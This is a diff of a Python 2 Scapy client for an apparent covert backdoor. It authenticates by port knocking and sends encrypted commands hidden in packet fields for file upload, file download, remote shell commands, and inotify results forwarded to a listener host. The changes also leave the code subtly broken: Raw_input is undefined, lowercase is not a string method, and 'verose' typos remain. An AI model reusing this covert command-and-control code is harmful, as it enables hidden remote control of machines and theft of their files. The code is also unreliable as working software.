@@ -64,7 +64,7 @@ def main():
 		print "Knock Sequence:  " + str(knock)
 		print " "
 		print "-Commands-"
-		print "C - Communication Protocol (TCP/UDP)"
+		print "C - Communication Protocol (tcp/UDP)"
 		print "A - change server address"
 		print "D - change command port"
 		print "P - change password"
@@ -73,27 +73,27 @@ def main():
 		print "Q - Exit program"
 		print "Input Command: "
 
-		choice = raw_input()
+		choice = Raw_input()
 		if choice == 'C' or choice == 'C':
 			print "Input the transport-later protocol to use: "
-			proto = raw_input()
-			if proto.uppercase == "TCP" or proto.uppercase == "UDP":
-				protocol = proto.uppercase()
+			proto = Raw_input()
+			if proto.lowercase == "tcp" or proto.lowercase == "udp":
+				protocol = proto.lowercase()
 			else:
-				warnings = warnings + "Supported protocols include TCP and UDP\n"
+				warnings = warnings + "Supported protocols include tcp and UDP\n"
 		elif choice == 'A' or choice == 'a':
 			print "Input new server address: "
-			address = raw_input()
+			address = Raw_input()
 		elif choice == 'D' or choice == 'd':
 			print "Input new Port: "
-			port = raw_input()
+			port = Raw_input()
 		elif choice == 'P' or choice == 'p':
 			print "Input new Password: "
-			password = raw_input()
+			password = Raw_input()
 		elif choice == 'K' or choice == 'k':
 			print "Input new Port Knock sequence."
 			print "Each port number should be comma deliminated: "
-			ports = raw_input()
+			ports = Raw_input()
 			knock[:] = []
 			for port in ports.split(","):
 				knock.append(int(port))
@@ -104,7 +104,7 @@ def main():
 				warnings = warnings + "Must have a password or knock sequence to connect to a server\n"
 			else:
 				try:
-					sendKnock(address, password, knock)
+					sendKnock(address, port, password, knock)
 					if checkAuthenticate(address, port):
 						sendCommand(address, port)
 				except KeyboardInterrupt:
@@ -146,17 +146,17 @@ def sendKnock(address, commandPort, password, knock):
 	if len(knock) < 1:
 		for c in password:
 			port = random.randint(0, 65535)
-			if protocol == "TCP":
+			if protocol == "tcp":
 				knockPacket = IP(dst=address, id=(idpass<<8) + ord(c))/\
 				              TCP(sport=commandPort, dport=port, seq=seq)
 				seq += 1
-			elif protocol == "UDP":
+				idpass += 1
+				send(knockPacket, verbose=0)
+			elif protocol == "udp":
 				knockPacket = IP(dst=address, id=(idpass<<8) + ord(c))/\
 				              UDP(sport=commandPort, dport=port)
-
-			idpass += 1
-
-			send(knockPacket, verbose=0)
+				idpass += 1
+				send(knockPacket, verbose=0)
 	else:
 		ipid = random.randint(0, 65535)
 		c = 0
@@ -170,15 +170,15 @@ def sendKnock(address, commandPort, password, knock):
 			else:
 				ipHead.id = ipid
 				ipid += 1
-			if protocol == "TCP":
+			if protocol == "tcp":
 				knockPacket = ipHead/\
 				              TCP(sport=commandPort, dport=port, seq=seq)
 				seq += 1
-			elif protocol == "UDP":
+				send(knockPacket, verbose=0)
+			elif protocol == "udp":
 				knockPacket = ipHead/\
 				              UDP(sport=commandPort, dport=port)
-
-			send(knockPacket, verbose=0)
+				send(knockPacket, verbose=0)
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -202,19 +202,18 @@ def sendKnock(address, commandPort, password, knock):
 ---------------------------------------------------------------------------------------------
 '''
 def checkAuthenticate(address, port):
-	packetFilter = ""
-	packetFilter = protocol + " and ip src " + address
-	
-	packets = sniff(count=1, filter=packetFilter, timeout=30)
-
-	if len(packets) == 0:
-		return False
-	else:
-		if protocol == "TCP":
-			port = packets[0][TCP].sport
-		elif protocol == "UDP":
-			port = packets[0][UDP].sport
-		return True
+	while True:
+		packetFilter = protocol + " and ip src " + address
+		packets = sniff(filter=packetFilter, count=1, timeout=30)
+		
+		if len(packets) == 0:
+			return False
+		else:
+			#if protocol == "tcp":
+			#	port = packets[0][TCP].sport
+			#elif protocol == "udp":
+			#	port = packets[0][UDP].sport
+			return True
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -238,7 +237,7 @@ def checkAuthenticate(address, port):
 ---------------------------------------------------------------------------------------------
 '''
 def sendCommand(address, port):
-	warings = ""
+	warnings = ""
 	while True:
 		os.system("clear")
 		print warnings
@@ -254,24 +253,24 @@ def sendCommand(address, port):
 		print "Note: These actions will terminate the client's connection to the server"
 		print "Input Command: "
 
-		choice = raw_input()
+		choice = Raw_input()
 		if choice == 'U' or choice == 'u':
 			print "Input file to upload: "
-			sFile = raw_input()
+			sFile = Raw_input()
 			sendFile(address, port, sFile)
 		elif choice == 'D' or choice == 'd':
 			print "Input file to download: "
-			gFile = raw_input()
+			gFile = Raw_input()
 			getFile(address, port, gFile)
 		elif choice == 'T' or choice == 't':
 			print "Input terminal command: "
-			command = raw_input()
+			command = Raw_input()
 			terminal(address, port, command)
 		elif choice == 'I' or choice == 'i':
 			print "Input file or directory to be watched: "
-			notice = raw_input()
+			notice = Raw_input()
 			print "Input IP address of listening server which should receive iNotify results: "
-			listener = raw_input()
+			listener = Raw_input()
 			notify(address, port, notice, listener)
 			return
 		elif choice == 'K' or choice == 'k':
@@ -315,33 +314,33 @@ def sendCommand(address, port):
 ---------------------------------------------------------------------------------------------
 '''
 def sendFile(address, port, sFile):
-	if protocol == "TCP":
+	if protocol == "tcp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215))/\
-			            RAW(LOAD=encrypt(sFile))
+			            Raw(LOAD=encrypt(sFile))
 		send(commandPacket, verose=0)
 		with open(sFile, "r") as tFile:
 			for line in tFile:
 				commandPacket[IP].id = commandPacket[IP].id + 1
 				commandPacket[TCP].seq = commandPacket[TCP].seq + 1
-				commandPacket[RAW].load = encrypt(line)
+				commandPacket[Raw].load = encrypt(line)
 				send(commandPacket, verbose=0)
 		commandPacket[IP].id = commandPacket[IP].id + 1
 		commandPacket[TCP].seq = commandPacket[TCP].seq + 1
-		commandPacket[RAW].load = ""
+		commandPacket[Raw].load = ""
 		commandPacket[TCP].flags="F"
-	elif protocol == "UDP":
+	elif protocol == "udp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 1, dport=port)/\
-			            RAW(LOAD=encrypt(sFile))
+			            Raw(LOAD=encrypt(sFile))
 		send(commandPacket, verose=0)
 		with open(sFile, "r") as tFile:
 			for line in tFile:
 				commandPacket[IP].id = commandPacket[IP].id + 1
-				commandPacket[RAW].load = encrypt(line)
+				commandPacket[Raw].load = encrypt(line)
 				send(commandPacket, verbose=0)
 		commandPacket[IP].id = commandPacket[IP].id + 1
-		commandPacket[RAW].load = ""
+		commandPacket[Raw].load = ""
 		commandPacket[UDP].sport = 0
 	send(commandPacket, verbose=0)
 
@@ -367,14 +366,14 @@ def sendFile(address, port, sFile):
 ---------------------------------------------------------------------------------------------
 '''
 def getFile(address, port, gFile):
-	if protocol == "TCP":
+	if protocol == "tcp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="A")/\
-			            RAW(load=encrypt(gFile))
-	elif protocol == "UDP":
+			            Raw(load=encrypt(gFile))
+	elif protocol == "udp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 2, dport=port)/\
-			            RAW(load=encrypt(gFile))
+			            Raw(load=encrypt(gFile))
 	send(commandPacket, verose=0)
 
 	with open(gFile, "w") as tFile:
@@ -384,7 +383,7 @@ def getFile(address, port, gFile):
 				break
 			if "F" in dPacket[0][TCP].flags:
 				break
-			tFile.write(dPacket[RAW].load)
+			tFile.write(dPacket[Raw].load)
 '''
 ---------------------------------------------------------------------------------------------
 -- 
@@ -409,10 +408,10 @@ def getFile(address, port, gFile):
 '''
 def terminal(address, port, command):
 	result = ""
-	if protocol == "TCP":
+	if protocol == "tcp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="S")/\
-			            RAW(load=encrypt(command))
+			            Raw(load=encrypt(command))
 		send(commandPacket, verose=0)
 	
 		while True:
@@ -425,10 +424,10 @@ def terminal(address, port, command):
 			result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>16))
 			result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>8))
 			result = result + chr(0x000000FF^(dPacket[0][TCP].seq))
-	elif protocol == "UDP":
+	elif protocol == "udp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 4, dport=port)/\
-			            RAW(load=encrypt(command))
+			            Raw(load=encrypt(command))
 		send(commandPacket, verose=0)
 	
 		while True:
@@ -466,14 +465,14 @@ def terminal(address, port, command):
 ---------------------------------------------------------------------------------------------
 '''
 def notify(address, port, notice, listener):
-	if protocol == "TCP":
+	if protocol == "tcp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="AS")/\
-			            RAW(load=encrypt(notice + "\n" + listener))
-	elif protocol == "UDP":
+			            Raw(load=encrypt(notice + "\n" + listener))
+	elif protocol == "udp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 8, dport=port)/\
-			            RAW(load=encrypt(notice + "\n" + listener))
+			            Raw(load=encrypt(notice + "\n" + listener))
 	send(commandPacket, verose=0)
 
 '''
@@ -498,10 +497,10 @@ def notify(address, port, notice, listener):
 ---------------------------------------------------------------------------------------------
 '''
 def kill(address, port):
-	if protocol == "TCP":
+	if protocol == "tcp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="F")
-	elif protocol == "UDP":
+	elif protocol == "udp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 16, dport=port)
 	send(commandPacket, verose=0)
